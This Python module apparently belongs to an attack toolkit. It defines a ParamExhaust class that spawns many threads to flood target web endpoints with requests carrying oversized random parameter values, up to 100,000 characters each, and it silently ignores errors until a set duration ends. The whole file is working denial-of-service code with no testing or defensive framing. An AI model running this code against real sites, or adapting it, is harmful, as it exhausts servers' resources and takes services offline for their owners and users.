import requests
import threading
import random
import logging
from .base import AttackBase

logger = logging.getLogger(__name__)

class ParamExhaust(AttackBase):
    def __init__(self, target, endpoints, config=None):
        super().__init__(target, config)
        self.endpoints = endpoints  # list of (url, method, inputs)
        self.thread_count = config.get('threads', 100) if config else 100

    def run(self):
        logger.info("Parameter exhaustion on %d endpoints", len(self.endpoints))
        threads = []
        for _ in range(self.thread_count):
            t = threading.Thread(target=self._worker, daemon=True)
            t.start()
            threads.append(t)
        self._stop_event.wait(self.duration)
        logger.info("Parameter exhaustion stopped")

    def _worker(self):
        while not self._stop_event.is_set():
            for url, method, inputs in self.endpoints:
                # Generate huge random payload
                data = {}
                for inp in inputs:
                    data[inp] = 'A' * random.randint(1000, 100000)
                try:
                    if method == 'POST':
                        requests.post(url, data=data, timeout=1)
                    else:
                        requests.get(url, params=data, timeout=1)
                except:
                    pass
